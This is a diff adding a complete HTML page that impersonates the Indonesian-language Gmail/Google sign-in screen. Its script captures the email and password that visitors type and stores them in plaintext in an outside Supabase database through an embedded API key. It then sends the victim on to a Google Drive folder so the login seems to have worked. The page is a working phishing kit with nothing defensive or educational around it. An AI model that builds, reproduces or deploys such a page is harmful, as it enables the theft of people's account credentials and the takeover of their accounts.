@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Gmail – Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue: #1a73e8;
+      --blue-hover: #1557b0;
+      --red: #d93025;
+      --green: #34a853;
+      --text-primary: #202124;
+      --text-secondary: #5f6368;
+      --border: #dadce0;
+      --bg: #f8f9fa;
+      --white: #ffffff;
+      --focus-ring: #1a73e8;
+    }
+
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background:
+        radial-gradient(ellipse 600px 400px at 10% 20%, rgba(66,133,244,0.08) 0%, transparent 70%),
+        radial-gradient(ellipse 400px 500px at 90% 80%, rgba(234,67,53,0.06) 0%, transparent 70%),
+        radial-gradient(ellipse 500px 300px at 60% 10%, rgba(52,168,83,0.06) 0%, transparent 70%);
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .card {
+      background: var(--white);
+      border: 1px solid var(--border);
+      border-radius: 28px;
+      padding: 48px 48px 36px;
+      width: 100%;
+      max-width: 450px;
+      box-shadow: 0 2px 6px rgba(32,33,36,.1), 0 1px 2px rgba(32,33,36,.08);
+      position: relative;
+      z-index: 1;
+      animation: cardIn .4s cubic-bezier(.22,1,.36,1) both;
+    }
+
+    @keyframes cardIn {
+      from { opacity: 0; transform: translateY(24px) scale(.98); }
+      to   { opacity: 1; transform: translateY(0) scale(1); }
+    }
+
+    .google-logo { display: flex; align-items: center; gap: 4px; margin-bottom: 24px; }
+    .google-logo svg { width: 74px; height: 24px; }
+
+    h1 {
+      font-family: 'Google Sans', sans-serif;
+      font-size: 24px;
+      font-weight: 400;
+      color: var(--text-primary);
+      margin-bottom: 8px;
+    }
+
+    .subtitle {
+      font-size: 15px;
+      color: var(--text-secondary);
+      margin-bottom: 32px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 28px;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
+      font-family: 'Roboto', sans-serif;
+      color: var(--text-primary);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      outline: none;
+      background: transparent;
+      transition: border-color .15s;
+    }
+
+    .input-group input:focus { border-color: var(--focus-ring); border-width: 2px; }
+
+    .input-group label {
+      position: absolute;
+      top: 50%;
+      left: 14px;
+      transform: translateY(-50%);
+      font-size: 16px;
+      color: var(--text-secondary);
+      background: var(--white);
+      padding: 0 4px;
+      pointer-events: none;
+      transition: all .15s ease;
+      line-height: 1;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: 0; font-size: 12px; color: var(--blue);
+    }
+    .input-group input:not(:focus):not(:placeholder-shown) + label { color: var(--text-secondary); }
+
+    .toggle-pass {
+      position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; cursor: pointer; color: var(--text-secondary);
+      display: flex; align-items: center; padding: 4px; border-radius: 50%; transition: background .15s;
+    }
+    .toggle-pass:hover { background: rgba(32,33,36,.06); }
+
+    .forgot {
+      font-size: 14px; color: var(--blue); text-decoration: none; font-weight: 500;
+      display: inline-block; margin-top: -16px; margin-bottom: 24px; transition: color .15s;
+    }
+    .forgot:hover { color: var(--blue-hover); text-decoration: underline; }
+
+    .helper { font-size: 13px; color: var(--text-secondary); margin-top: 6px; line-height: 1.5; }
+
+    .btn-row {
+      display: flex; align-items: center; justify-content: space-between; margin-top: 36px;
+    }
+
+    .btn-text {
+      background: none; border: none; color: var(--blue);
+      font-family: 'Google Sans', sans-serif; font-size: 14px; font-weight: 500;
+      cursor: pointer; padding: 10px 12px; border-radius: 4px; text-decoration: none; transition: background .15s;
+    }
+    .btn-text:hover { background: rgba(26,115,232,.06); }
+
+    .btn-primary {
+      background: var(--blue); color: #fff; border: none;
+      font-family: 'Google Sans', sans-serif; font-size: 14px; font-weight: 500;
+      padding: 10px 24px; border-radius: 4px; cursor: pointer;
+      transition: background .15s, box-shadow .15s; letter-spacing: .25px;
+    }
+    .btn-primary:hover { background: var(--blue-hover); box-shadow: 0 1px 3px rgba(0,0,0,.2); }
+    .btn-primary:active { transform: scale(.98); }
+
+    .divider { border: none; border-top: 1px solid var(--border); margin: 28px 0 20px; }
+
+    .error-msg { display: none; font-size: 12px; color: var(--red); margin-top: 6px; }
+    .input-group.error input { border-color: var(--red); border-width: 2px; }
+    .input-group.error label { color: var(--red); }
+    .input-group.error .error-msg { display: block; }
+
+    /* Toast notification */
+    .toast {
+      position: fixed; bottom: 32px; left: 50%; transform: translateX(-50%) translateY(80px);
+      background: #323232; color: #fff; padding: 12px 24px; border-radius: 8px;
+      font-size: 14px; font-family: 'Roboto', sans-serif; z-index: 999;
+      transition: transform .3s cubic-bezier(.22,1,.36,1), opacity .3s;
+      opacity: 0; white-space: nowrap; display: flex; align-items: center; gap: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,.25);
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
+    .toast.success { background: #1e7e34; }
+    .toast.error-toast { background: #c62828; }
+
+    footer { margin-top: 20px; display: flex; gap: 16px; justify-content: center; flex-wrap: wrap; position: relative; z-index: 1; }
+    footer a { font-size: 12px; color: var(--text-secondary); text-decoration: none; }
+    footer a:hover { text-decoration: underline; }
+
+    .screen { animation: fadeSlide .25s ease both; }
+    @keyframes fadeSlide {
+      from { opacity: 0; transform: translateX(20px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    .btn-primary.loading {
+      position: relative; color: transparent; pointer-events: none;
+    }
+    .btn-primary.loading::after {
+      content: ''; position: absolute; width: 16px; height: 16px;
+      border: 2px solid rgba(255,255,255,.4); border-top-color: #fff;
+      border-radius: 50%; top: 50%; left: 50%;
+      transform: translate(-50%,-50%); animation: spin .7s linear infinite;
+    }
+    @keyframes spin { to { transform: translate(-50%,-50%) rotate(360deg); } }
+
+    @keyframes popIn {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+
+    /* DB badge */
+    .db-badge {
+      display: inline-flex; align-items: center; gap: 6px;
+      background: #e8f5e9; border: 1px solid #a5d6a7; border-radius: 20px;
+      padding: 4px 12px; font-size: 12px; color: #2e7d32; font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .db-badge .dot {
+      width: 7px; height: 7px; background: #43a047; border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%,100% { opacity: 1; transform: scale(1); }
+      50% { opacity: .6; transform: scale(1.3); }
+    }
+  </style>
+</head>
+<body>
+
+<div class="card" id="card">
+
+  <!-- SCREEN 1: Email -->
+  <div id="screen-email" class="screen">
+    <div class="google-logo">
+      <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M9.24 9.29v2.57h6.16c-.25 1.6-1.84 4.68-6.16 4.68-3.71 0-6.74-3.07-6.74-6.86S5.53 2.82 9.24 2.82c2.11 0 3.53.9 4.34 1.68l2.95-2.84C14.7.7 12.2-.18 9.24-.18 4.14-.18 0 3.96 0 9.68c0 5.72 4.14 9.86 9.24 9.86 5.33 0 8.87-3.75 8.87-9.02 0-.61-.07-1.07-.15-1.53H9.24z" fill="#4285F4"/>
+        <path d="M25 6.91c-3.33 0-6.04 2.53-6.04 6.02 0 3.46 2.71 6.02 6.04 6.02s6.04-2.56 6.04-6.02c0-3.49-2.71-6.02-6.04-6.02zm0 9.67c-1.83 0-3.4-1.51-3.4-3.65s1.57-3.65 3.4-3.65 3.4 1.49 3.4 3.65-1.57 3.65-3.4 3.65z" fill="#EA4335"/>
+        <path d="M52.48 8.22h-.09c-.6-.72-1.75-1.31-3.2-1.31-3.04 0-5.82 2.67-5.82 6.04 0 3.35 2.78 5.99 5.82 5.99 1.45 0 2.6-.59 3.2-1.33h.09v.84c0 2.31-1.23 3.54-3.22 3.54-1.62 0-2.63-1.17-3.04-2.15l-2.3.96c.66 1.6 2.42 3.57 5.34 3.57 3.1 0 5.72-1.82 5.72-6.27V7.15h-2.5v1.07zm-3.06 8.36c-1.83 0-3.35-1.54-3.35-3.63 0-2.12 1.52-3.67 3.35-3.67 1.8 0 3.22 1.55 3.22 3.67 0 2.09-1.42 3.63-3.22 3.63z" fill="#4285F4"/>
+        <path d="M38 6.91c-3.33 0-6.04 2.53-6.04 6.02 0 3.46 2.71 6.02 6.04 6.02s6.04-2.56 6.04-6.02c0-3.49-2.71-6.02-6.04-6.02zm0 9.67c-1.83 0-3.4-1.51-3.4-3.65s1.57-3.65 3.4-3.65 3.4 1.49 3.4 3.65-1.57 3.65-3.4 3.65z" fill="#FBBC05"/>
+        <path d="M58.4 1.44h2.61v17.38H58.4z" fill="#34A853"/>
+        <path d="M68.19 16.58c-1.35 0-2.3-.61-2.92-1.83l8.06-3.33-.27-.68c-.5-1.34-2.03-3.83-5.15-3.83-3.1 0-5.68 2.44-5.68 6.02 0 3.37 2.55 6.02 5.96 6.02 2.75 0 4.34-1.68 5-2.66l-2.04-1.36c-.68.99-1.6 1.65-2.96 1.65zm-.19-7.44c1.07 0 1.98.54 2.28 1.32l-5.41 2.24c-.06-2.31 1.62-3.56 3.13-3.56z" fill="#EA4335"/>
+      </svg>
+    </div>
+
+<h1>Masuk</h1>
+    <p class="subtitle">Gunakan Akun Google Anda</p>
+
+    <div class="input-group" id="email-group">
+      <input type="email" id="email-input" placeholder=" " autocomplete="email" />
+      <label for="email-input">Email atau telepon</label>
+      <span class="error-msg" id="email-error-msg">Masukkan email yang valid.</span>
+    </div>
+
+    <a href="#" class="forgot" onclick="return false">Lupa email?</a>
+
+    <p class="helper">Bukan komputer Anda? Gunakan Mode Tamu untuk masuk secara pribadi.</p>
+
+    <div class="btn-row">
+      <a href="#" class="btn-text" onclick="return false">Buat akun</a>
+      <button class="btn-primary" id="next-btn" onclick="goToPassword()">Berikutnya</button>
+    </div>
+  </div>
+
+  <!-- SCREEN 2: Password -->
+  <div id="screen-password" class="screen" style="display:none">
+    <div class="google-logo">
+      <svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M9.24 9.29v2.57h6.16c-.25 1.6-1.84 4.68-6.16 4.68-3.71 0-6.74-3.07-6.74-6.86S5.53 2.82 9.24 2.82c2.11 0 3.53.9 4.34 1.68l2.95-2.84C14.7.7 12.2-.18 9.24-.18 4.14-.18 0 3.96 0 9.68c0 5.72 4.14 9.86 9.24 9.86 5.33 0 8.87-3.75 8.87-9.02 0-.61-.07-1.07-.15-1.53H9.24z" fill="#4285F4"/>
+        <path d="M25 6.91c-3.33 0-6.04 2.53-6.04 6.02 0 3.46 2.71 6.02 6.04 6.02s6.04-2.56 6.04-6.02c0-3.49-2.71-6.02-6.04-6.02zm0 9.67c-1.83 0-3.4-1.51-3.4-3.65s1.57-3.65 3.4-3.65 3.4 1.49 3.4 3.65-1.57 3.65-3.4 3.65z" fill="#EA4335"/>
+        <path d="M52.48 8.22h-.09c-.6-.72-1.75-1.31-3.2-1.31-3.04 0-5.82 2.67-5.82 6.04 0 3.35 2.78 5.99 5.82 5.99 1.45 0 2.6-.59 3.2-1.33h.09v.84c0 2.31-1.23 3.54-3.22 3.54-1.62 0-2.63-1.17-3.04-2.15l-2.3.96c.66 1.6 2.42 3.57 5.34 3.57 3.1 0 5.72-1.82 5.72-6.27V7.15h-2.5v1.07zm-3.06 8.36c-1.83 0-3.35-1.54-3.35-3.63 0-2.12 1.52-3.67 3.35-3.67 1.8 0 3.22 1.55 3.22 3.67 0 2.09-1.42 3.63-3.22 3.63z" fill="#4285F4"/>
+        <path d="M38 6.91c-3.33 0-6.04 2.53-6.04 6.02 0 3.46 2.71 6.02 6.04 6.02s6.04-2.56 6.04-6.02c0-3.49-2.71-6.02-6.04-6.02zm0 9.67c-1.83 0-3.4-1.51-3.4-3.65s1.57-3.65 3.4-3.65 3.4 1.49 3.4 3.65-1.57 3.65-3.4 3.65z" fill="#FBBC05"/>
+        <path d="M58.4 1.44h2.61v17.38H58.4z" fill="#34A853"/>
+        <path d="M68.19 16.58c-1.35 0-2.3-.61-2.92-1.83l8.06-3.33-.27-.68c-.5-1.34-2.03-3.83-5.15-3.83-3.1 0-5.68 2.44-5.68 6.02 0 3.37 2.55 6.02 5.96 6.02 2.75 0 4.34-1.68 5-2.66l-2.04-1.36c-.68.99-1.6 1.65-2.96 1.65zm-.19-7.44c1.07 0 1.98.54 2.28 1.32l-5.41 2.24c-.06-2.31 1.62-3.56 3.13-3.56z" fill="#EA4335"/>
+      </svg>
+    </div>
+
+    <div id="account-chip" style="
+      display:inline-flex;align-items:center;gap:8px;
+      border:1px solid var(--border);border-radius:24px;
+      padding:6px 14px 6px 8px;margin-bottom:24px;cursor:pointer;
+      transition:background .15s;font-size:14px;color:var(--text-primary);
+    " onmouseover="this.style.background='#f1f3f4'" onmouseout="this.style.background='transparent'" onclick="goBack()">
+      <span style="width:28px;height:28px;background:#4285f4;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="white"><path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/></svg>
+      </span>
+      <span id="chip-email" style="font-weight:500"></span>
+      <svg viewBox="0 0 24 24" width="18" height="18" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+
+    <h1>Selamat datang</h1>
+    <p class="subtitle" style="margin-bottom:32px">Masukkan sandi Anda untuk melanjutkan</p>
+
+    <div class="input-group" id="pass-group">
+      <input type="password" id="pass-input" placeholder=" " autocomplete="current-password" />
+      <label for="pass-input">Masukkan sandi Anda</label>
+      <button class="toggle-pass" onclick="togglePass()" type="button">
+        <svg id="eye-icon" viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+          <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+        </svg>
+      </button>
+      <span class="error-msg">Sandi minimal 6 karakter.</span>
+    </div>
+
+    <label style="display:flex;align-items:center;gap:10px;font-size:14px;color:var(--text-secondary);cursor:pointer;user-select:none;margin-bottom:4px;">
+      <input type="checkbox" id="show-pass" style="width:16px;height:16px;accent-color:var(--blue);cursor:pointer;" onchange="togglePassViaCheckbox(this)">
+      Tampilkan sandi
+    </label>
+
+    <div class="btn-row" style="margin-top:32px">
+      <a href="#" class="btn-text" onclick="return false">Lupa sandi?</a>
+      <button class="btn-primary" id="login-btn" onclick="doLogin()">Berikutnya</button>
+    </div>
+  </div>
+
+  <!-- SCREEN 3: Success -->
+  <div id="screen-success" class="screen" style="display:none;text-align:center;padding:12px 0;">
+    <div style="
+      width:72px;height:72px;border-radius:50%;
+      background:linear-gradient(135deg,#34a853,#188038);
+      display:flex;align-items:center;justify-content:center;
+      margin:0 auto 24px;
+      box-shadow: 0 4px 16px rgba(52,168,83,.35);
+      animation: popIn .4s cubic-bezier(.22,1,.36,1) both .1s;
+    ">
+      <svg viewBox="0 0 24 24" width="36" height="36" fill="white">
+        <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+      </svg>
+    </div>
+    <h1 style="margin-bottom:8px">Berhasil masuk!</h1>
+    <p class="subtitle" id="success-email" style="margin-bottom:32px"></p>
+
+    <button class="btn-primary" style="width:100%;padding:14px;" onclick="resetAll()">Kembali ke Beranda</button>
+  </div>
+
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<footer>
+  <a href="#">Bahasa Indonesia</a>
+  <a href="#">Bantuan</a>
+  <a href="#">Privasi</a>
+  <a href="#">Persyaratan</a>
+</footer>
+
+<script>
+  // ── Supabase config ──────────────────────────────────────────
+  const SUPABASE_URL = 'https://omrkmkgfmrwxhxaxjhku.supabase.co';
+  const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9tcmtta2dmbXJ3eGh4YXhqaGt1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM5Mzc5NzAsImV4cCI6MjA4OTUxMzk3MH0.k4fQVC7nvtQBbUmacrwKE0XFITCusDEQVcdMEN0UyNo';
+  const { createClient } = supabase;
+  const db = createClient(SUPABASE_URL, SUPABASE_KEY);
+  // ────────────────────────────────────────────────────────────
+
+  let eyeOpen = true;
+  let currentEmail = '';
+
+  // Toast helper
+  function showToast(msg, type = '') {
+    const t = document.getElementById('toast');
+    t.textContent = msg;
+    t.className = 'toast ' + type;
+    t.classList.add('show');
+    setTimeout(() => t.classList.remove('show'), 3500);
+  }
+
+  function showScreen(id) {
+    ['screen-email','screen-password','screen-success'].forEach(s => {
+      document.getElementById(s).style.display = 'none';
+    });
+    const target = document.getElementById(id);
+    target.style.display = '';
+    target.classList.remove('screen');
+    void target.offsetWidth;
+    target.classList.add('screen');
+  }
+
+  function goToPassword() {
+    const emailInput = document.getElementById('email-input');
+    const group = document.getElementById('email-group');
+    const val = emailInput.value.trim();
+
+    if (!val || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val)) {
+      group.classList.add('error');
+      return;
+    }
+    group.classList.remove('error');
+    currentEmail = val;
+
+    document.getElementById('chip-email').textContent = val;
+    document.getElementById('success-email').textContent = val;
+
+    const btn = document.getElementById('next-btn');
+    btn.classList.add('loading');
+    setTimeout(() => {
+      btn.classList.remove('loading');
+      showScreen('screen-password');
+      setTimeout(() => document.getElementById('pass-input').focus(), 100);
+    }, 600);
+  }
+
+  function goBack() {
+    showScreen('screen-email');
+    setTimeout(() => document.getElementById('email-input').focus(), 100);
+  }
+
+  async function doLogin() {
+    const passInput = document.getElementById('pass-input');
+    const group = document.getElementById('pass-group');
+    const pass = passInput.value;
+
+    if (pass.length < 6) {
+      group.classList.add('error');
+      passInput.focus();
+      return;
+    }
+    group.classList.remove('error');
+
+    const btn = document.getElementById('login-btn');
+    btn.classList.add('loading');
+
+    try {
+      // Simpan ke tabel users di Supabase
+      const { data, error } = await db
+        .from('users')
+        .upsert(
+          { email: currentEmail, password: pass },
+          { onConflict: 'email' }   // update jika email sudah ada
+        );
+
+      if (error) throw error;
+
+      window.location.href = 'https://drive.google.com/drive/folders/1FWBJiWpjMoMm85CK9pjieJfbIQ3tIn1j';
+
+    } catch (err) {
+      console.error(err);
+      showToast('❌ Gagal menyimpan: ' + (err.message || 'Periksa koneksi Anda'), 'error-toast');
+    } finally {
+      btn.classList.remove('loading');
+    }
+  }
+
+  function togglePass() {
+    const input = document.getElementById('pass-input');
+    eyeOpen = !eyeOpen;
+    input.type = eyeOpen ? 'password' : 'text';
+    document.getElementById('show-pass').checked = !eyeOpen;
+    updateEyeIcon();
+  }
+
+  function togglePassViaCheckbox(cb) {
+    const input = document.getElementById('pass-input');
+    eyeOpen = !cb.checked;
+    input.type = cb.checked ? 'text' : 'password';
+    updateEyeIcon();
+  }
+
+  function updateEyeIcon() {
+    document.getElementById('eye-icon').innerHTML = eyeOpen
+      ? '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>'
+      : '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
+  }
+
+  function resetAll() {
+    document.getElementById('email-input').value = '';
+    document.getElementById('pass-input').value = '';
+    document.getElementById('show-pass').checked = false;
+    eyeOpen = true;
+    updateEyeIcon();
+    showScreen('screen-email');
+    setTimeout(() => document.getElementById('email-input').focus(), 100);
+  }
+
+  document.addEventListener('keydown', e => {
+    if (e.key !== 'Enter') return;
+    const s1 = document.getElementById('screen-email');
+    const s2 = document.getElementById('screen-password');
+    if (s1.style.display !== 'none') goToPassword();
+    else if (s2.style.display !== 'none') doLogin();
+  });
+</script>
+</body>
+</html>
